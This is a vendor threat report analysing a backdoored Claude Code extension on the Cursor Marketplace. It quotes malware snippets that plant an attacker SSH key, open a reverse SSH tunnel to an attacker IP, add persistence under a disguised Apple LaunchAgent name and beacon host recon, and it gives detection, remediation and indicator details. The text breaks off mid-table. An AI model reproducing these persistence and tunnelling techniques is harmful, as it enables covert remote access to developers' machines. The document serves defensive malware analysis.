 Threat Report      TL;DR   Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.  Organisations should immediately review their environments for use of Claude Code for VSCode  2.1.312  or  2.1.313  and engage incident response where use of the extension is discovered.      Update (31 October 2026):   Cursor&rsquo;s security notice  now identifies versions  2.1.312  and  2.1.313  distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only  2.1.313 ; the affected-version guidance below has been updated accordingly.   Phorion has discovered a compromise of the official  Claude Code for VS Code  extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions,  2.1.312  and  2.1.313 , from its marketplace.  While the implant includes setup and persistence logic for  macOS, Linux, and Windows , we&rsquo;re going to focus primarily on  macOS  in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.  The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.  Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user,  systemsetup -getremotelogin  prints an administrator-access error and exits with status  0  instead of returning  Off . Because the script only tries to enable SSH if the output matches  Off , it skips the enablement step entirely. On a Mac that doesn&rsquo;t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.  In this post, we&rsquo;ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.  Infection Chain  The Cursor Marketplace Extension  The compromised  extension.js  file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal  activate  and  deactivate  exports, and UI code.  The injected prefix pulls in standard Node.js modules ( child_process ,  fs ,  os ,  path ,  http , and  crypto ) and executes as soon as Node loads the file, before the extension&rsquo;s normal  activate  callback even runs. The user doesn&rsquo;t need to interact with the extension for the payload to fire.  Stage 1 - Preparing SSH Access  First, the payload makes sure  ~/.ssh  exists and appends an attacker-controlled Ed25519 public key to  ~/.ssh/authorized_keys , setting permissions to  0700  on the directory and  0600  on the file.  The key uses the comment  svc-telemetry . Before appending, the script checks whether  svc-telemetry  is already in the file rather than checking for the key itself. When hunting for this activity, it&rsquo;s worth checking the public-key fingerprint rather than relying solely on the comment string.       var  sd  =  path.join(HOME,  ".ssh" ),
        ak  =  path.join(sd,  "authorized_keys" );
     // ...
      if  (cur.indexOf( "svc-telemetry" )  <   0 ) {
      fs.appendFileSync(ak, PUB  +   "\n" );
      d.sshKey  =   "added" 
    }  else  {
      d.sshKey  =   "present" 
    }
      Here,  cur  holds the existing contents of  authorized_keys , and  PUB  is the embedded attacker public key (redacted here).  With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:    Linux:  tries to enable and start  sshd  or  ssh  via  systemctl , falling back to  service  and  /etc/init.d/ .   macOS:  checks Remote Login and, if it reports  Off , tries to enable it via  sudo -n systemsetup -setremotelogin on .   Windows:  tries to install and start OpenSSH Server using PowerShell.   None of these steps include a privilege escalation exploit. Non-interactive  sudo -n  will fail unless the user already has passwordless sudo cached or configured, so starting a system service won&rsquo;t always succeed from a standard user context.  It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function ( det() ) that hardcodes  /bin/sh , which isn&rsquo;t going to get very far on a standard Windows install.  A bug in the macOS SSH logic?  On macOS, the setup may run into problems before it even gets to the  sudo  command. The script runs  systemsetup -getremotelogin  without elevation and tests the output against  /Off/i . It only tries to enable Remote Login if the output contains  Off :       // ...
      else   if  (PLAT  ===   "darwin" ) {
       var  rl  =  ex( "systemsetup -getremotelogin 2>/dev/null" ,  4000 );
      d.remoteLogin  =  rl;
       if  ( /Off/i .test(rl)) {
        det( "sudo -n systemsetup -setremotelogin on >/dev/null 2>&1" );
        d.remoteLoginOn  =   "tried" 
      }
    }
      Notice that the second command ( -setremotelogin on ) uses  sudo -n , while the first command ( -getremotelogin ) doesn&rsquo;t. When you run  systemsetup -getremotelogin  as a standard user on macOS, you get this instead:      You need administrator access to run this tool... exiting!
       systemsetup  refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status  0 . The malware&rsquo;s  ex()  helper grabs stdout and returns it:       function  ex(c, t) {
       try  {
         return  cp.execSync(c, {
          timeout :  t  ||   3000 ,
          stdio :  [ "ignore" ,  "pipe" ,  "ignore" ],
          windowsHide :   true 
        }).toString().trim()
      }  catch  (e) {
         return   "" 
      }
    }
      Because the output is  "You need administrator access to run this tool... exiting!" ,  /Off/i.test(rl)  evaluates to  false .  As a result, the script skips the  if  block and never runs  sudo -n systemsetup -setremotelogin on . It effectively treats &ldquo;I don&rsquo;t have permission to check if SSH is off&rdquo; as &ldquo;SSH is already on&rdquo;, which also explains why you won&rsquo;t see the enablement attempt in process telemetry when the extension runs as a normal user.    This bug can break the final step of the access chain.  If Remote Login isn&rsquo;t already enabled on the Mac, the outbound tunnel can still connect to the attacker&rsquo;s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.   Of course, that isn&rsquo;t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.  Stage 2 - Establishing the Reverse SSH Tunnel  Next, the script sets up an outbound SSH connection to  134.209.82[.]225  as the  tunnel  user on port 22. To authenticate to the attacker&rsquo;s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment  svc-telemetry-tun .  It&rsquo;s worth keeping the two keys straight during an investigation:   The public key added to  ~/.ssh/authorized_keys  ( svc-telemetry ) lets the attacker log into the victim&rsquo;s machine.  The embedded private key ( svc-telemetry-tun ) lets the victim&rsquo;s machine connect out to the attacker&rsquo;s tunnel server.   The script writes this tunnel key to the OS temporary directory with a filename starting with  .stk_ , followed by the first ten characters of the MD5 hash of the hostname and home directory path:       var  kf  =  path.join(
      TMP,
       ".stk_"   +  crypto.createHash( "md5" )
        .update( String (os.hostname())  +  HOME).digest( "hex" ).slice( 0 ,  10 )
    );
     // ...
      var  RF  =  (PLAT  ===   "win32" )  ?   "\"*:0:localhost:22\""   :   "'*:0:localhost:22'" ;
      The tunnel uses  -R *:0:localhost:22  for remote port forwarding. Passing  0  asks the attacker&rsquo;s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to  localhost:22  on the victim&rsquo;s machine:      Affected host -- outbound SSH tunnel --> External SSH server

    Operator -- separate connection --> Server's allocated port
                                                |
                                     Through the existing tunnel
                                                |
                                                v
                                      Affected host's SSH:22
                                                |
                                      Login using the planted key
      Because the tunnel runs with  -N , it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim&rsquo;s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.  The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled,  known_hosts  is ignored,  BatchMode  and  IdentitiesOnly  are enabled, keepalives are set to 30 seconds ( ServerAliveCountMax=3 ), and  ExitOnForwardFailure  is turned on.  If  autossh  is installed, the script uses it; otherwise it falls back to standard  ssh . It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using  pgrep  on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.  Stage 3 - Keeping Access Available  To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:      Platform  Artifacts  Persistence mechanism  Notes      Linux   ~/.config/.smt ,  ~/.config/.smtk   Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an  @reboot  entry to the user&rsquo;s crontab.  Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).    macOS   ~/.config/.smt ,  ~/.config/.smtk ,  ~/Library/LaunchAgents/com.apple.sysmond.plist   Writes a user LaunchAgent that runs  /bin/sh ~/.config/.smt  with  RunAtLoad  and  KeepAlive  set to  true , then loads it via  launchctl .  Runs in the user context rather than as a root LaunchDaemon.    Windows   ~/.config/smt.cmd ,  ~/.config/smtk ,  %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd   Tries to create a scheduled task named  SysMon  running as  SYSTEM  on startup. If that fails, drops  sysmon.cmd  into the user&rsquo;s Startup folder.  Creating a  SYSTEM  task requires admin privileges; the Startup folder fallback runs as the user at login.      On macOS and Linux, the  ~/.config/.smt  script has the tunnel private key embedded inside it and writes it out to  ~/.config/.smtk  before starting the reconnection loop.  On macOS, the LaunchAgent disguises itself as  com.apple.sysmond.plist  inside  ~/Library/LaunchAgents/ :       <key> Label </key> 
     <string> com.apple.sysmond </string> 
     <!-- ... --> 
     <key> RunAtLoad </key> 
     <true/> 
     <key> KeepAlive </key> 
     <true/> 
      Stage 4 - Host Recon  Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker&rsquo;s server:   Hostname, username, OS platform, and architecture  Home directory, current working directory, and global Git email ( git config --global user.email )  Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)  Up to 40 environment variable  names  (not values) matching  /KEY|TOKEN|SECRET|PASS|AWS|GCP/i    The environment variable check uses  Object.keys(process.env) :       Object .keys(process.env)
      .filter( function (k) {
         return   /KEY|TOKEN|SECRET|PASS|AWS|GCP/i .test(k)
      })
      .slice( 0 ,  40 )
      Because it only grabs the variable names, the beacon doesn&rsquo;t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.  To get the machine&rsquo;s public IP, the script queries  ifconfig[.]me , falling back to  api[.]ipify[.]org .  It then sends the JSON report via plaintext HTTP POST requests to  /beacon  on both  134.209.82[.]225:8099  and  127.0.0.1:8099 :       var  r  =  http.request({
      host :  h,
      port :  p,
      path :   "/beacon" ,
      method :   "POST" ,
      timeout :   3000 ,
      headers :  { "content-type"  :   "application/json" }
    },  function (res) {
      res.resume()
    });
     // ...
     r.write(JSON.stringify(d));
    r.end()
      Why it also sends a copy of the beacon to  127.0.0.1:8099  isn&rsquo;t clear from the sample; the script itself doesn&rsquo;t set up a local listener on that port.  The beacon is scheduled once with  setTimeout  (1.5 seconds after the initial setup runs) and discards any HTTP response with  res.resume() . It&rsquo;s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.  Detection Opportunities  From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.  SSH Key and Configuration Changes  Because the malware appends to  ~/.ssh/authorized_keys  directly using Node&rsquo;s  fs.appendFileSync , process-only rules watching for shell commands like  echo  or  tee  touching  authorized_keys  won&rsquo;t catch it. This is where file modification telemetry is essential: watching for IDE helper processes ( Code Helper ,  Cursor Helper , etc.) creating or writing to  ~/.ssh/authorized_keys .  Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.  While you should also monitor for  systemsetup -setremotelogin on , don&rsquo;t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won&rsquo;t run at all.  User LaunchAgent Persistence  The persistence setup on macOS gives us a couple of strong signals:   A non-Apple process writing a plist with a  com.apple.*  label ( ~/Library/LaunchAgents/com.apple.sysmond.plist ).  A LaunchAgent configured to execute  /bin/sh  against a hidden script in the user&rsquo;s home directory ( ~/.config/.smt ).   Because the initial tunnel is spawned as a detached process and  launchd  later manages  .smt  directly, the subsequent  ssh  processes won&rsquo;t have the IDE as their immediate parent in a live process tree. Correlating the file creation of  .smt  and  com.apple.sysmond.plist  back to the IDE extension host makes it much easier to piece the chain together.  SSH Tunnels and Follow-On Access  On the process and network side, look for:    ssh  or  autossh  launched with remote port forwarding ( -R *:0:localhost:22 ) and identity files pulled from  /tmp/.stk_*  or  ~/.config/.smtk .  Outbound SSH connections to  134.209.82[.]225  on port 22, alongside HTTP POST requests to  134.209.82[.]225:8099  (and connection attempts to  127.0.0.1:8099 ).   If you find a host where this extension ran, it&rsquo;s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from  localhost  ( 127.0.0.1  or  ::1 ) authenticating with the  svc-telemetry  key.  Remediation  If you identify an affected machine,  uninstalling the extension alone won&rsquo;t remove the backdoor . Make sure your response covers all of the stages it drops:    Kill active tunnel processes:  Terminate the  /bin/sh  retry loop and any  ssh  or  autossh  processes connecting to  134.209.82[.]225 .   Remove persistence:  Unload and delete  ~/Library/LaunchAgents/com.apple.sysmond.plist  on macOS (or clean up the  @reboot  cron entry on Linux /  SysMon  scheduled task and Startup script on Windows), and remove  ~/.config/.smt  and  ~/.config/.smtk .   Clean up SSH keys and state:  Remove the  svc-telemetry  public key from  ~/.ssh/authorized_keys , delete  /tmp/.stk_* , and verify that Remote Login (SSH) hasn&rsquo;t been enabled unexpectedly.   Rotate credentials:  If SSH was enabled on the host, or if there&rsquo;s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the  KEY|TOKEN|SECRET|PASS|AWS|GCP  environment variable filter).   Phorion&rsquo;s Approach  Phorion&rsquo;s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creating  com.apple.*  LaunchAgents and LaunchAgents executing shell scripts from hidden directories.  Beyond persistence, Phorion&rsquo;s file access telemetry captures the IDE extension host modifying  ~/.ssh/authorized_keys  directly, and  Phorion Protections  can be used to lock down  ~/.ssh/  so that only authorised processes can read or modify SSH keys and configuration files in the first place.  If you want to see how Phorion detects and blocks supply chain threats like this across your Mac fleet,  get in touch to arrange a demo .  Indicators  Sample and Public-Key Fingerprints      Indicator  Value  Notes      SHA-256   ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15   Backdoored  extension.js  bundle    Victim-login public-key fingerprint   SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk   Ed25519 key appended to  ~/.ssh/authorized_keys  (comment  svc-telemetry )    Tunnel public-key fingerprint   SHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQ   Embedded Ed25519 key used to authenticate to the tunnel server (comment  svc-telemetry-tun )      Network Indicators      Indicator  Type  Notes       134.209.82[.]225  (TCP  22 , user  tunnel )  IP / SSH  Outbound reverse SSH tunnel server     134.209.82[.]225:8099  ( POST /beacon )  IP / HTTP  External host-report beacon endpoint     127.0.0.1:8099  ( POST /beacon )  Loopback / HTTP  Local beacon destination     ifconfig[.]me ,  api[.]ipify[.]org   Domain  Legitimate services queried for public IP discovery      Host Artifacts      Artifact  Platform  Notes       ~/.<ide>/extensions/anthropic.claude-code-2.1.312-darwin-arm64   macOS (Apple Silicon)  Additional affected version identified in Cursor&rsquo;s security notice ( <ide>  varies by editor)     ~/.<ide>/extensions/anthropic.claude-code-2.1.313-darwin-arm64   macOS (Apple Silicon)  Installed extension d